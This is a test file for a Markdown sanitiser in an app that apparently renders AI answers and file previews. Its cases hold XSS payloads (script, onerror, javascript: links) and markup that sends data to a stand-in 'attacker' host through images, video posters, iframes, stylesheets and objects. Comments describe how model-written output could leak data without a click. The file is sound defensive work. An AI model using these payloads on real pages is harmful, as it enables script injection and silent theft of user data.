// @vitest-environment jsdom
import { describe, expect, it } from 'vitest';
import { MARKDOWN_TAGS, fileLinkTarget, renderFileMarkdown, renderMarkdown } from './markdown';

// Parses HTML through the DOM instead of matching substrings, since a
// substring check like `not.toContain('<script')` also passes for escaped
// text such as `&lt;script&gt;`, which proves nothing about the real risk.
function parse(html: string): HTMLElement {
  const el = document.createElement('div');
  el.innerHTML = html;
  return el;
}

describe('renderMarkdown', () => {
  it('renders bold text as <strong>', () => {
    const el = parse(renderMarkdown('**oi**'));
    expect(el.querySelector('strong')?.textContent).toBe('oi');
  });

  it('renders a fenced block as <pre><code> without interpreting its contents as Markdown', () => {
    const el = parse(renderMarkdown('```\n**not bold**\n```'));
    const code = el.querySelector('pre > code');
    expect(code?.textContent).toBe('**not bold**\n');
  });

  it('drops a <script> tag from the output', () => {
    const el = parse(renderMarkdown('<script>alert(1)</script>'));
    expect(el.querySelector('script')).toBeNull();
  });

  it('drops an onerror attribute from an <img>', () => {
    const el = parse(renderMarkdown('<img src=x onerror="alert(1)">'));
    expect(el.querySelector('img')?.hasAttribute('onerror')).toBe(false);
  });

  it('drops a javascript: href from a link', () => {
    const el = parse(renderMarkdown('[x](javascript:alert(1))'));
    const anchor = el.querySelector('a');
    // DOMPurify strips the unsafe attribute rather than the element, so the
    // link survives without its `href` at all.
    expect(anchor?.hasAttribute('href')).toBe(false);
  });

  it('returns a string without throwing for an unterminated fence (a streamed partial delta)', () => {
    expect(() => renderMarkdown('texto\n```bash\nnpm test')).not.toThrow();
    expect(typeof renderMarkdown('texto\n```bash\nnpm test')).toBe('string');
  });

  it('turns a single newline inside a paragraph into a <br> (breaks: true)', () => {
    const el = parse(renderMarkdown('linha um\nlinha dois'));
    expect(el.querySelector('br')).not.toBeNull();
  });

  it('keeps an image by default, which is what the notes preview renders', () => {
    const el = parse(renderMarkdown('![](https://exemplo/foto.png)'));
    expect(el.querySelector('img')?.getAttribute('src')).toBe('https://exemplo/foto.png');
  });

  it('drops an image on the markdownOnly path, so untrusted text cannot beacon out a GET', () => {
    // No CSP in this repo, so a remote image an answer chose the URL of would be fetched with no
    // click at all — the query string is whatever the model wrote.
    const el = parse(renderMarkdown('![](https://attacker/?d=segredo)', { markdownOnly: true }));
    expect(el.querySelector('img')).toBeNull();
  });

  it('drops a raw <img> tag too, not just Markdown image syntax', () => {
    const el = parse(renderMarkdown('<img src="https://attacker/?d=segredo">', { markdownOnly: true }));
    expect(el.querySelector('img')).toBeNull();
  });

  // Every one of these comes back from this DOMPurify version with `img` merely forbidden, which is
  // why the chat path is an allowlist instead: each is a GET of an address the model chose, made
  // without a click.
  const fetchers: [string, string, string][] = [
    ['a poster on a <video>', '<video poster="https://attacker/?d=segredo"></video>', 'video'],
    ['an <input type="image">', '<input type="image" src="https://attacker/?d=segredo">', 'input'],
    ['an <image> inside <svg>', '<svg><image href="https://attacker/?d=segredo"></image></svg>', 'svg, image'],
    ['a preloading <video src>', '<video src="https://attacker/?d=segredo" preload="auto"></video>', 'video'],
    ['an <iframe>', '<iframe src="https://attacker/?d=segredo"></iframe>', 'iframe'],
  ];
  for (const [what, markup, selector] of fetchers) {
    it(`renders nothing for ${what} in an answer`, () => {
      const el = parse(renderMarkdown(markup, { markdownOnly: true }));
      expect(el.querySelectorAll(selector)).toHaveLength(0);
    });
  }

  it('keeps everything Markdown legitimately produces: an allowlist that ate a table would be worse', () => {
    const el = parse(
      renderMarkdown(
        '# Título\n\n## Dois\n\ntexto **forte** *ênfase* ~~riscado~~ `inline` [link](https://exemplo "t")\n\n- um\n  - aninhado\n\n1. primeiro\n\nentre\n\n3. terceiro\n\n> citação\n\n---\n\n| a | b |\n| :- | -: |\n| 1 | 2 |\n\n```bash\nnpm test\n```\n',
        { markdownOnly: true },
      ),
    );

    expect(el.querySelector('h1')?.textContent).toBe('Título');
    expect(el.querySelector('h2')?.textContent).toBe('Dois');
    expect(el.querySelector('strong')?.textContent).toBe('forte');
    expect(el.querySelector('em')?.textContent).toBe('ênfase');
    expect(el.querySelector('del')?.textContent).toBe('riscado');
    const anchor = el.querySelector('a');
    expect(anchor?.getAttribute('href')).toBe('https://exemplo');
    expect(anchor?.getAttribute('title')).toBe('t');
    expect(el.querySelector('ul > li > ul > li')?.textContent).toBe('aninhado'); // nested lists survive
    expect(el.querySelector('ol > li')?.textContent).toBe('primeiro');
    // `start` is in the allowlist: a list that begins at 3 must not silently renumber itself to 1.
    expect(el.querySelectorAll('ol')[1]?.getAttribute('start')).toBe('3');
    expect(el.querySelector('blockquote p')?.textContent).toBe('citação');
    expect(el.querySelector('hr')).not.toBeNull();
    expect(el.querySelectorAll('table thead th')).toHaveLength(2);
    expect(el.querySelectorAll('table tbody td')).toHaveLength(2);
    expect(el.querySelector('table thead th')?.getAttribute('align')).toBe('left'); // GFM alignment kept
    const code = el.querySelector('pre > code');
    expect(code?.textContent).toBe('npm test\n');
    expect(code?.getAttribute('class')).toBe('language-bash');
  });

  it('renders a task list as plain bullets, since `input` is the tag being refused', () => {
    // The accepted cost of the allowlist: no checkbox, and the text of the item is still there.
    const el = parse(renderMarkdown('- [ ] tarefa\n- [x] feita', { markdownOnly: true }));

    expect(el.querySelector('input')).toBeNull();
    expect(Array.from(el.querySelectorAll('li')).map((li) => li.textContent?.trim())).toEqual(['tarefa', 'feita']);
  });

  it('never lets an anchor out carrying a target, on either path', () => {
    // A link that opens in a new tab keeps a handle on this one through `window.opener`. `target` is
    // not in DOMPurify's default attribute allowlist and is not in the chat path's either, so the
    // invariant is that it never arrives — this goes red the day someone allows it.
    for (const options of [undefined, { markdownOnly: true }, { markdownOnly: false }]) {
      const anchor = parse(renderMarkdown('<a href="https://exemplo" target="_blank">x</a>', options)).querySelector('a');
      expect(anchor?.hasAttribute('target')).toBe(false);
    }
  });

  it('allows no foreign-content or raw-text element, which is what makes the code-block round trip safe', () => {
    // `decorateCodeBlocks` parses this output again and re-serialises it. Inside `svg`, `math`,
    // `template`, `noscript`, `style`, `textarea` or `title`, HTML parses by different rules than it
    // serialises, so that second parse can turn inert text into live markup (mXSS). The day one of
    // them is allowed — `svg` for an inline diagram, say — this has to fail instead of the injection
    // appearing silently in the chat.
    for (const tag of ['svg', 'math', 'template', 'noscript', 'style', 'textarea', 'title']) {
      expect(MARKDOWN_TAGS).not.toContain(tag);
    }
  });

  it('returns the empty string for empty input', () => {
    expect(renderMarkdown('')).toBe('');
  });
});

describe('renderFileMarkdown (a previewed file)', () => {
  const render = (md: string, dir = 'docs') => parse(renderFileMarkdown(md, dir));

  it('renders headings, tables, lists and code', () => {
    const el = render('# T\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\n- x\n\n```ts\nconst a = 1;\n```');
    expect(el.querySelector('h1')?.textContent).toBe('T');
    expect(el.querySelectorAll('td')).toHaveLength(2);
    expect(el.querySelector('li')?.textContent).toBe('x');
    expect(el.querySelector('pre > code')?.getAttribute('class')).toBe('language-ts');
  });

  it('drops scripts, event handlers and javascript: links', () => {
    const el = render('<script>alert(1)</script><b onclick="alert(1)">x</b>\n\n[y](javascript:alert(1))');
    expect(el.querySelector('script')).toBeNull();
    expect(el.querySelector('[onclick]')).toBeNull();
    expect(el.querySelector('a')?.hasAttribute('href')).toBe(false);
  });

  it.each([
    ['<video poster="https://attacker/?d=x"></video>', 'video'],
    ['<input type="image" src="https://attacker/?d=x">', 'input'],
    ['<svg><image href="https://attacker/?d=x"></image></svg>', 'svg, image'],
    ['<iframe src="https://attacker/?d=x"></iframe>', 'iframe'],
    ['<img src="https://attacker/?d=x">', 'img'],
    ['<link rel="stylesheet" href="https://attacker/x.css">', 'link'],
    ['<style>body{background:url(https://attacker/)}</style>', 'style'],
    ['<object data="https://attacker/x"></object>', 'object'],
  ])('fetches nothing: %s', (markup, selector) => {
    expect(render(markup).querySelector(selector)).toBeNull();
  });

  it('turns an image into a link that only opens on click', () => {
    const el = render('![gráfico](https://exemplo/g.png)');
    expect(el.querySelector('img')).toBeNull();
    const a = el.querySelector('a');
    expect(a?.textContent).toBe('imagem: gráfico');
    expect(a?.getAttribute('href')).toBe('https://exemplo/g.png');
    expect(a?.getAttribute('target')).toBe('_blank');
  });

  it('escapes markup in an image alt text', () => {
    const el = render('![<img src=x onerror=alert(1)>](https://exemplo/g.png)');
    expect(el.querySelector('img')).toBeNull();
    expect(el.querySelector('[onerror]')).toBeNull();
  });

  it('opens web links in a new tab without opener or referrer', () => {
    const a = render('[site](https://termhub.dev)').querySelector('a');
    expect(a?.getAttribute('target')).toBe('_blank');
    expect(a?.getAttribute('rel')).toBe('noopener noreferrer nofollow');
  });

  it('marks a relative Markdown link as another preview, resolved against the file folder', () => {
    const a = render('[plano](../plans/x.md)', 'docs/superpowers/specs').querySelector('a');
    expect(a?.getAttribute('data-file-link')).toBe('docs/superpowers/plans/x.md');
  });

  it('removes the href of a link to anything else', () => {
    for (const md of ['[a](file:///etc/passwd)', '[b](data:text/html,x)', '[c](mailto:a@b)', '[d](./foto.png)']) {
      const a = render(md).querySelector('a');
      expect(a?.hasAttribute('href')).toBe(false);
      expect(a?.hasAttribute('data-file-link')).toBe(false);
    }
  });
});

describe('fileLinkTarget', () => {
  it('resolves relative paths and keeps absolute ones', () => {
    expect(fileLinkTarget('x.md', '/home/u/p/docs')).toEqual({ kind: 'file', path: '/home/u/p/docs/x.md' });
    expect(fileLinkTarget('./a/b.md', '~/notes')).toEqual({ kind: 'file', path: '~/notes/a/b.md' });
    expect(fileLinkTarget('../README.md', '')).toEqual({ kind: 'file', path: '../README.md' });
    expect(fileLinkTarget('/tmp/a.md', 'docs')).toEqual({ kind: 'file', path: '/tmp/a.md' });
    expect(fileLinkTarget('a%20b.md#sec', 'docs')).toEqual({ kind: 'file', path: 'docs/a b.md' });
  });
  it('sends only http(s) to the browser', () => {
    expect(fileLinkTarget('https://x/a', 'd')).toEqual({ kind: 'web', url: 'https://x/a' });
    expect(fileLinkTarget('#titulo', 'd')).toBeNull();
    expect(fileLinkTarget('//evil/a.md', 'd')).toBeNull();
  });
});
